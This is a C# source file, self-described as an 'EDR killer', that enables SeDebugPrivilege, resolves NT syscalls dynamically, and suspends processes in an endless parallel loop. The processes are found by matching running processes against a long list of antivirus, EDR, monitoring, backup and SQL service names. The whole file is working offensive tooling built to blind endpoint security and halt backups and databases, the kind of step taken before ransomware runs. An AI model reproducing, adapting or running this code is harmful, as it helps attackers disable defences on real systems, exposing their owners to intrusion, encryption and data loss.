/* a VERY simple EDR killer based on my/an obscure research about process handles and protected process */

using System;
using System.Runtime.InteropServices;
using static DInvoke.DynamicInvoke.Generic;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Threading;



const int PROCESS_SUSPEND_RESUME = 0x0800; 
const int INVALID_HANDLE_VALUE = -1;
const int SE_PRIVILEGE_ENABLED = 0x00000002;
const int TokenAdjustPrivileges = 0x0020;


IntPtr NtSP = GetSyscallStub("NtSuspendProcess");
NtSuspendProcess NtSuspendProcess = Marshal.GetDelegateForFunctionPointer<NtSuspendProcess>(NtSP);

IntPtr NtOP = GetSyscallStub("NtOpenProcess");
NtOpenProcess NtOpenProcess = Marshal.GetDelegateForFunctionPointer<NtOpenProcess>(NtOP);

IntPtr NtOPT = GetSyscallStub("NtOpenProcessToken");
NtOpenProcessToken NtOpenProcessToken = Marshal.GetDelegateForFunctionPointer<NtOpenProcessToken>(NtOPT);

IntPtr NtATP = GetSyscallStub("NtAdjustPrivilegesToken");
NtAdjustPrivilegesToken NtAdjustPrivilegesToken = Marshal.GetDelegateForFunctionPointer<NtAdjustPrivilegesToken>(NtATP);

IntPtr ntc = GetSyscallStub("NtClose");
NtClose NtClose = Marshal.GetDelegateForFunctionPointer<NtClose>(ntc);


IntPtr GetAdvapi(string FunctionName)
{
    return GetLibraryAddress("Advapi32.dll", FunctionName, true);
} // wrapper to load the functions from Advapi.dll


void InitializeObjectAttributesStructure(OBJECT_ATTRIBUTES oa) {
    oa.Length = Marshal.SizeOf(oa);
    oa.RootDirectory = IntPtr.Zero;
    oa.ObjectName = IntPtr.Zero;
    oa.Attributes = 0;
    oa.SecurityDescriptor = IntPtr.Zero;
    oa.SecurityQualityOfService = IntPtr.Zero;
}


void NtAdjustPrivilege(string privilege)
{
    IntPtr lookforit = GetAdvapi("LookupPrivilegeValueA");
    LookupPrivilegeValue LookupPrivilegeValue = Marshal.GetDelegateForFunctionPointer<LookupPrivilegeValue>(lookforit);

    IntPtr CurrentTokenHandle = IntPtr.Zero;
    int TokenResult = NtOpenProcessToken((IntPtr)(-1), TokenAdjustPrivileges | 0x0008, out CurrentTokenHandle);
    if (TokenResult == 0) { Console.WriteLine("[+] Opened a Handle to the Current Process Token"); }

    LUID_AND_ATTRIBUTES luidAndAttributes = new LUID_AND_ATTRIBUTES();
    luidAndAttributes.Luid = new LUID();
    if (!LookupPrivilegeValue(null, privilege, ref luidAndAttributes.Luid))
    {
        Console.WriteLine("Error looking up privilege value");
        return;
    }
    luidAndAttributes.Attributes = SE_PRIVILEGE_ENABLED;

    // Prepare the TOKEN_PRIVILEGES structure
    TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES();
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges = new LUID_AND_ATTRIBUTES[] { luidAndAttributes };

    TOKEN_PRIVILEGES PrevtokenPrivileges = new TOKEN_PRIVILEGES();


    // Call NtAdjustPrivilegesToken
    int returnLength = 0;
    int result = NtAdjustPrivilegesToken(CurrentTokenHandle, 0, ref tokenPrivileges, Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)),
        ref PrevtokenPrivileges, ref returnLength);

    if (result == 0) { Console.WriteLine($"[*] Enabled {privilege} for the Current Process Token"); }
    if (result != 0)
    {
        Console.WriteLine("[-] Failed to Adjust Process Token, exiting...");
        if (result == -1073741790) { Console.WriteLine("[-] Token Adjustment Failed with STATUS_ACCESS_DENIED, try running as an Administrator in a High Integritry Process"); }

        else { Console.WriteLine(result); }
        Environment.Exit(-1);
    }


}


int GetPID(string procName) // process to kill
{
    try
    {
        Process process = Process.GetProcessesByName(procName).FirstOrDefault(); // to not crash
        int pid = process.Id;
        //Console.WriteLine($"[*] Process {procName}, PID: {pid}");
        return pid;
    }
    catch (Exception) { return 0; } // catch a pokemon
}


List<string> GetTargetProcesses()
{
    string[] EDRList = { "win32ui.exe", "evolve-xdr-agent.exe", "evolve-xdr-agent","EvolveXDR", "Evolve XDR", "Evolve-XDR", "agent_auth", "SecurityHealthServiceSysStray", "hmpalert", "mcsagent", "TESvc.exe", "EPWD.exe", "epam_svc.exe", "epab_svc.exe", "cptrayLogic.exe", "cptrayWUI.exe", "ERFService.exe", "cpda.exe", "IDAFServerHostService.exe", "cylance", "comodo", "cavwp", "cis", "cmdicap", "cmdagent", "activeconsole", "authtap", "avast", "avecto", "canary", "carbon", "cb.exe", "ciscoamp", "ciscoamp", "countertack", "cramtray", "crssvc", "crowdstrike", "csagent", "csfalcon", "csshell", "cybereason", "cyclorama", "cylance", "cyoptics", "cyupdate", "cyvera", "cyserver", "cytray", "defendpoint", "defender", "eectrl", "emcoreservice", "emsystem", "endgame", "fireeye", "forescout", "fortiedr", "groundling", "GRRservice", "healthservice", "inspector", "ivanti", "kaspersky", "lacuna", "logrhythm", "logcollector", "malware", "mandiant", "mcafee", "monitoringhost", "morphisec", "mpcmdrun", "msascuil", "msmpeng", "mssense", "msmpeng", "nissrv", "ntrtscan", "osquery", "PaloAltoNetworks", "pgeposervice", "pgsystemtray", "privilegeguard", "procwall", "protectorservice", "qradar", "redcloak", "secureconnector", "secureworks", "securityhealthservice", "semlaunchsvc", "senseir", "sense", "sentinel", "sepliveupdate", "sisidsservice", "sisipsservice", "sisipsutil", "smc.exe", "smcgui", "snac64", "sophos", "splunk", "srtsp", "symantec", "symcorpui", "symefasi", "sysinternal", "sysmon", "tanium", "tda.exe", "tdawork", "tmlisten", "tmbmsrv", "tmssclient", "tmccsf", "tpython", "trend", "watchdogagent", "wincollect", "windowssensor", "wireshark", "xagt", "Acronis Privacy Expert Suite", "Agnirum Outpost Firewall", "AhnLab", "AhnLab Spy Zero", "AhnLab V3 Internet Security", "AhnLab V3 Light", "Ahnsd Korean AV", "Altiris", "Altiris Agent", "Altiris Client", "Altiris Express NS Client Manager", "Altiris Process", "Altiris remote login client", "Aluria Security Center ", "AntiVir Security Management Center Agent Module ", "AnVir.exe", "Atompark StaffCop", "Avast", "Avast Firewall Service", "Avast GUI", "Avast Internet Security", "AVG", "AVG 8.5", "AVG 8.5/9.0 IDS", "AVG 8.5 IDS", "AVG 8/8.5", "AVG 9.0 FW", "AVG Anti-Virus", "AVG Internet Security", "AVG Internet Security (32-bit)", "AVG Internet Security (64-bit)", "AVG Registry Cleaner", "AVG SysTools", "AVG VProtect Application for SafeSearch", "Avira", "Avira AntiVir", "AVIRA Personal Edition Classic", "Baidu AV", "Barracuda Malware Removal Tool", "SECURITY_PRODUCT", "Bitdefender", "Bitdefender Free", "BitDefender Security Suite", "Bkav AV", "BlackIce Firewall", "Black Ice IDS  ", "Broadcom ASF IP monitoring service", " BullGuard Internet Security", "BullGuard Internet Security", "CA AntiVirus ISafe Service", "CA AntiVirus Realtime Infection Report", "CA AntiVirus VET Message Service", "CA eTrust Integrated Threat Management 8.1", "CA eTrust Integrated Threat Management 8.1/CA Jinchen Kill", "CA Internet Security Suite 2007", "CA Internet Security Suite 2007/8/9", "CA Internet Security Suite 2008", "CA Internet Security Suite 2008/9", "CA Internet Security Suite 2008 Antispyware", "CA Internet Security Suite 2009", "CA Jinchen Kill", "CA Jinchen KILL / eTrust Antivirus", "CA Jinchen Kill Realtime Monitor", "NGAV EDR", "Cisco Security Agent", "Cisco Security Agent 5.1", "EDR process", "EDR service", "ClamAV", "Client and Host Security Platform ", "Client Security Solution ", "Comodo", "Comodo Firewall Pro", "Comodo Internet Security", "Comodo Personal Firewall", "COMODO VIRUS SCANNER", "EDR NGAV", "NGAV EDR", "NGAV EDR ", "Deep Freeze TM EDR", "Deep Security TM EDR", "DrWeb", "DrWeb Enterprise", "DrWeb Plesk COM for Windows", "DrWeb Total Security ", "eEye Retina Digital Security ", "Emsisoft Internet Security", "Entensys UserGate 5", "Enterprise Security Agent", "ESET Remote Administrator", "eTrust", "eTrust Antivirus", "eTrust Firewall", "eTrust Internet Security Suite", "EventTracker by Prism Microsystems", "EventTracker by Prism Microsystems  change ", "EventTracker Console", "EventTracker log cache", "EventTracker , pops up and disappears", "EventTracker Scheduler", "EventTracker SNMP Trap service", "Ewido Security Suite ", "Ewido Security Suite", "enSilo Data Protection Collector Service", "FortiClient Host Security", "FortiClient Host Security 3.0.459", "Fortinet Smart Security ", "F-PROT Antivirus", "F-Secure Alert and Management Extension Handler", "F-Secure Anti-Virus Updater", "F-Secure Authentication Agent", "F-Secure Backweb Temporary Files", "F-Secure Configuration Handler", "F-Secure Installation Launcher", "F-Secure Internet Security", "F-Secure Internet Security GUI", "G Data", "G Data Internet Security 2007", "GFI EndPointSecurity", "GFI EndPoint Security", "GFI EndPointSecurity ", "GoldenDolphin Chinese IDS", "HP Protecttools Security Manager ", "HP ProtectTools Security Manager ", "Huawei SACC Agent", "Intel Management and Security ", "ISS_Proventia_Agent 9.0 from IBM", "ISS RealSecure IDS", "ISS Security Scanner ", "Jiangmin AV and FW", "Kaspersky", "Kaspersky ", "Kaspersky Administration Kit", "Kaspersky Administration Server", "Kaspersky Anti-Spam for Outlook or Outlook Express", "Kaspersky Anti-Virus for Lotus Notes", "Kaspersky Anti-Virus management service process", "Kaspersky Anti-Virus remote management process", "Kaspersky Anti-Virus service process", "Kaspersky Anti-Virus working process", "Kaspersky command line utility process", "Kaspersky Lab Cisco NAC Posture Validation Server", "Kaspersky Lab Deployment Tool Agent", "Kaspersky Network Agent", "Kaspersky Network Configuration Tool", "Kaspersky script interception dispatcher service process", "Kaspersky task tray process", "Kerio Personal Firewall 2.1.5", "Kerio Winroute Firewall", "Kingsoft", "Kingsoft Antivirus", "Kingsoft Internet Security", "Kingsoft Internet Security 2008", "LanAgent Monitoring", "Lavasoft Ad-Aware", "LockTime NetLimiter 2 Monitor", "Malwarebytes Anti-Malware", "Mcafee", "McAfee", "McAfee Agent", "McAfee Agent AAC Host", "McAfee Agent Common Services", "McAfee Agent Service", "McAfee AntiSpyware", "McAfee Anti Spyware", "McAfee AntiSpyware application", "McAfee AntiSpyware Component", "McAfee AntiVirus Component", "McAfee antivirus software", "McAfee Application Installer", "McAfee Canary Process", "McAfee Compat service", "McAfee.com VirusScan Online Realtime Engine", "McAfee Core Firewall Service", "McAfee DAO Logger", "McAfee Desktop Firewall", "McAfee Desktop Firewall Traybar Helper", "McAfee Endpoint Protection ", "McAfee Endpoint Security Platform component hosting server", "McAfee ePolicy Orchestrator", "McAfee Firewall", "McAfee Firewall Business Object Hosting Server", "McAfee Framework Services", "McAfee Guardian Tray Icon", "McAfee GUI", "McAfee HookCore Service", "McAfee Internet Security", "McAfee Internet Security Suite", "McAfee Management Service", "McAfee NeoTrace", "McAfee On-access scanner", "McAfee Personal Firewall", "McAfee Personal Firewall Component", "McAfee Personal Firewall Tray icon", "McAfee Privacy Service", "McAfee Process Validation", "McAfee QuickClean", "McAfee Registration Wizard", "McAfee Rogue System Sensor", "McAfee SAFe Common Technology", "Mcafee Scanner for Lotus Notes", "McAfee Security Center Dashboard", "McAfee Security Centre Module", "McAfee Security Scan", "McAfee SiteAdvisor", "McAfee Spamkiller", "McAfee SpamKiller Module", "McAfee Stinger", "McAfee System Monitor", "McAfee Task Scheduler", "McAfee Threat Prevention Service", "McAfee Total Protection for Small Business", "McAfee Update Manager", "McAfee User Interface", "McAfee VirusScan", "McAfee VirusScan Activity Log Server", "McAfee VirusScan Command Handler", "McAfee VirusScan Component", "McAfee VirusScan Emergency Disk Creator", "McAfee Virusscan Enterprise", "McAfee VirusScan Enterprise", "McAfee VirusScan for EPOC OS", "McAfee VirusScan for Palm OS", "McAfee VirusScan for WindowsCE OS", "Mcafee VirusScan Framework Service", "McAfee VirusScan Main Console", "McAfee VirusScan Module", "McAfee VirusScan On-Access Scanner", "McAfee VirusScan Online", "McAfee VirusScan Scheduler", "McAfee VirusScan Synchronization Manager", "McAfee VirusScan Task Manager", "McAfee Web and ActiveX Scanner", "McAfee Web Control Service", "McAfee", "McAfee Cloud AV", "McAfee", "Microsoft AntiSpyware", "Microsoft AntiSpyware Alert Process", "Microsoft AntiSpyware Cleaner Process", "Microsoft AntiSpyware Helper Process", "Microsoft AntiSpyware Notifier Process", "Microsoft AntiSpyware Server Process", "Microsoft AntiSpyware Updater Process", "Microsoft Forefront Client Security Management Service ", "Microsoft Forefront Client Security State Assessment Service ", "Microsoft Network Inspection System", "Microsoft Security Center Data Protection Manager ", "Microsoft Security Essentials", "CORE_OS", "MSC BAM Services ", "MS Content Management Service ", "MWR Deteqt Suite EDR", "MWR OmniAgent", "Nero Security Service ", "Netgate Spy Emergency", "Netlimiter Traffic Monitor", "Netsys Enterprise Security (Encryption) ", "Network Monitor Agent", "Nod32", "NOD32 Update Viewer", "Norman Ad-Aware SE Plus Antivirus 1.06r1 and Firewall 1", "Norman Ad-Aware SE Plus Antivirus 1.06r1 and Firewall 1 ", "Norton Security Deluxe", "nProtect", " nProtect", "Omniquad Total Security 3.0.0", "Outpost Security", "Panda", "Panda AdminSecure upgrade utility", "Panda Agent", "Panda Anti-Virus", "Panda Enterprise", "Panda Internet Security", "Panda Network Manager", "Panda Titanium", "PC Tools Firewall Plus", "Process Explode process viewer", "Process Monitor", "Qurb/CA Internet Security 2008/9 AntiSpam", "Radialpoint Security Services PCGuard ", "Rising", "Rising Antispyware", "Rising Anti-Spyware", "Rising AntiVirus", "Rising Anti-Virus", "Rising Firewall", "Salfeld Personal Security Manager ", "Secret Net", "Security Technology Solutions SMSexpress ", "SiliVaccine Antivirus", "Simply Super Software Trojan Scanner", "SIWF BAM Services ", "SmartLine DeviceLock", "SmartLine DeviceLock Service", "SmartLine DeviceLock Tray Notifier", "Sophos Anti-Virus", "Sophos Anti-Virus AutoUpdate", "Sophos Anti-Virus GUI is OPEN", "Sophos Anti-Virus Scanner   ", "Sophos Control Center", "Sophos Endpoint Security", "Sophos FIREWALL", "Sophos FIREWALL GUI is OPEN", "SpywareBlaster Internet Security Tool ", "Spyware Doctor", "Spyware_Doctor 5 from PC Tools", "Spyware Nuker", "StatWin", "StatWin Total", "Steganos Security Suite Component ", "Sunbelt Personal Firewall", "Sunbelt Personal Firewall 4", "Super WinSpy", "Symantec", "Symantec Endpoint Protection ", "Symantec LiveUpdate", "Symantec Mail Security", "Symantec Mail Security ", "Symantec Network Access Control", "Symantec Network Access List", "Symantec (or possibly Sygate, check path)", "Symantec or Veritas Net Backup", "Symantec Reporting Service", "Symantec System Tray Icon", "Sysinternals Process Explorer", "SysInternals TDI Monitor", "Threatfire", "Threatfire GUI", "ThreatFire PSP", "Traffic Inspector 2.0", "TrendMicro", "TrendMicro Anti-Spyware", "Trend Micro Control Manager", "TrendMicro Infrastructure", "Trend Micro Internet Security", "TrendMicro InterScan System Monitor", "TrendMicro OfficeScan", "TrendMicro OfficeScan Personal Firewall", "TrendMicro or DrWatson", "TrendMicro PC-cillin", "TrendMicro Personal Firewall", "TrendMicro ScanMail for Exchange", "TrendMicro ServerProtect", "USB Disk Security ", "USB thumb drive security ", "Vipre", "VRV Security Software", "VRV Security Software ", "Webroot SecureAnywhere", "Websense Web Security / Web Filter ", "Windows Defender", "Windows Defender or Microsoft Forefront (Check Registry Keys)", "Windows Media Device Manager Pre-Message Security Protocol Service ", "Windows Security Update ", "Zillya Antivirus", "ZoneAlarm", "ZoneAlarm Component", "ZoneAlarm ForceField", "ZoneAlarm IDS", "ZoneAlarm Internet Security Suite 2007", "Deep Instinct NGAV", "bdredline.exe", "ProductAgentService.exe", "bdagent.exe", "bdreinit.exe", "downloader.exe", "EPConsole.exe", "EPHost.exe", "EPHost.Integrity.exe", "EPHost.Integrity.Legacy.exe", "EPIntegrationService.exe", "EPLowPrivilegeWorker.exe", "EPProtectedService.exe", "EPSecurityService.exe", "EPSupportManager.exe", "EPUpdateService.exe", "mitm_install_tool_dci.exe", "Product.Configuration.Tool.exe", "product.console.exe", "Product.Support.Tool.exe", "testinitsigs.exe", "WscRemediation.exe", "AcronisAgent", "AcrSch2Svc", "backup", "BackupExecAgentAccelerator", "BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "BackupExecRPCService", "BackupExecVSSProvider", "CAARCUpdateSvc", "CASAD2DWebSvc", "ccEvtMgr", "ccSetMgr", "DefWatch", "GxBlr", "GxCIMgr", "GxCVD", "GxFWD", "GxVss", "Intuit.QuickBooks.FCS", "memtas", "mepocs", "PDVFSService", "QBCFMonitorService", "QBFCService", "QBIDPService", "RTVscan", "SavRoam", "sophos", "sql", "stc_raw_agent", "svc$", "veeam", "VeeamDeploymentService", "VeeamNFSSvc", "VeeamTransportSvc", "VSNAPVSS", "vss", "YooBackup", "YooIT", "zhudongfangyu", "SQLPBDMS", "SQLPBENGINE", "MSSQLFDLauncher", "SQLSERVERAGENT", "MSSQLServerOLAPService", "SSASTELEMETRY", "SQLBrowser", "SQL Server Distributed Replay Client", "SQL Server Distributed Replay Controller", "MsDtsServer150", "SSISTELEMETRY150", "SSISScaleOutMaster150", "SSISScaleOutWorker150", "MSSQLLaunchpad", "SQLWriter", "SQLTELEMETRY", "MSSQLSERVER" };
    //string[] EDRList = { "SentinelAgent", "SentinelServiceHost", "SentinelStaticEngine", "SentinelStaticEngineScanner", "SentinelStaticEngineScanner", "SentinelUI", "SecurityHealthServiceSysStray" };
    Process[] ProcList = Process.GetProcesses();
    List<string> exist = new List<string>() { };


    Console.WriteLine("[+] finding intersting processes...");
    foreach (Process proc in ProcList)
    {
        foreach (string processName in EDRList)
        {
            if (proc.ProcessName.ToLower().Contains(processName.ToLower()))
            {
                //Console.WriteLine($"[+] Saving: {proc.ProcessName}");
                exist.Add(proc.ProcessName);

            }

        }
    }

    if (exist.ToArray().Length == 0) {
        Console.WriteLine("[+] Found 0 Interesting processes, exiting....");
        Environment.Exit(0);
    }

    Console.WriteLine("[*] Done");
    Console.WriteLine($"[+] Found: {exist.ToArray().Length} process(s)");
    return exist;
}


void HandleError(object var, object var2, string ErrorMessage)
{ // using (object) to make it accept any data type

    if (var == var2) // something like if hSCM == NULL
    {
        Console.WriteLine(Marshal.GetLastWin32Error());
        Console.WriteLine(ErrorMessage);
        Environment.Exit(-1);
    }
}


void OpenSuspend(int pid) { 
    OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
    InitializeObjectAttributesStructure(oa);
    CLIENT_ID ci = new CLIENT_ID
    {
        UniqueProcess = (IntPtr)pid
    };

    IntPtr pHandle = IntPtr.Zero;

    int status = NtOpenProcess(
        ref pHandle,
        PROCESS_SUSPEND_RESUME,
        ref oa,
        ref ci
        );

    //Console.WriteLine(status);

    HandleError(pHandle, IntPtr.Zero, "[-] Process Handle is Null");
    HandleError(pHandle.ToInt64(), INVALID_HANDLE_VALUE, "[-] Process Handle is INVALID");

    int statuss = NtSuspendProcess(pHandle); // error expected during looping
    //Console.WriteLine(status);

    NtClose(pHandle);
}   


void EternalSuspention() 
{
    // parrallel execution
    NtAdjustPrivilege("SeDebugPrivilege"); // if it was that easy :)

    List<string> ExistingProcesses = GetTargetProcesses(); // list of existing protected processes on the system
    Console.WriteLine("[*] Starting Suspention PARTY");
    Console.WriteLine("[+] Interval: 200 MS");

    while (true)
    {
        Parallel.ForEach(ExistingProcesses, new ParallelOptions { MaxDegreeOfParallelism = 30 }, async process =>
        {
            // running on a high threading model due to how fast and computing in-expensive syscalls are.
            int pid = GetPID(process);
            OpenSuspend(pid);
            Thread.Sleep(200);
        });

    }

}


EternalSuspention();











/* Delegates */

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtOpenProcess(
       ref IntPtr hProcess,
       int access,
       ref OBJECT_ATTRIBUTES objectAttributes,
       ref CLIENT_ID clientId
   );


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtSuspendProcess(IntPtr hProc);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtAdjustPrivilegesToken(
    IntPtr TokenHandle,
    byte DisableAllPrivileges,
    ref TOKEN_PRIVILEGES NewState,
    int BufferLength,
    ref TOKEN_PRIVILEGES PreviousState,
    ref int ReturnLength);


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtOpenProcessToken(
    IntPtr ProcessHandle,
    uint DesiredAccess,
    out IntPtr TokenHandle
);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr NtClose(IntPtr HANDLE);


public delegate bool LookupPrivilegeValue(
    string lpSystemName,
    string lpName,
    ref LUID lpLuid
);

/* structs */

[StructLayout(LayoutKind.Sequential)]
public struct OBJECT_ATTRIBUTES
{
    public int Length;
    public IntPtr RootDirectory;
    public IntPtr ObjectName;
    public int Attributes;
    public IntPtr SecurityDescriptor;
    public IntPtr SecurityQualityOfService;
}

[StructLayout(LayoutKind.Sequential)]
public struct CLIENT_ID
{
    public IntPtr UniqueProcess;
    public IntPtr UniqueThread;
}

public enum ADJUST_PRIVILEGE_TYPE
{
    AdjustCurrentProcess,
    AdjustCurrentThread
};

public struct LUID_AND_ATTRIBUTES
{
    /// LUID->_LUID
    public LUID Luid;
    /// DWORD->int
    public int Attributes;
}

public struct LUID
{
    /// DWORD->int
    public int LowPart;
    /// LONG->int
    public int HighPart;
}


public struct TOKEN_PRIVILEGES
{
    /// DWORD->int
    public int PrivilegeCount;
    /// LUID_AND_ATTRIBUTES[1]
    [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.Struct)]
    public LUID_AND_ATTRIBUTES[] Privileges;
}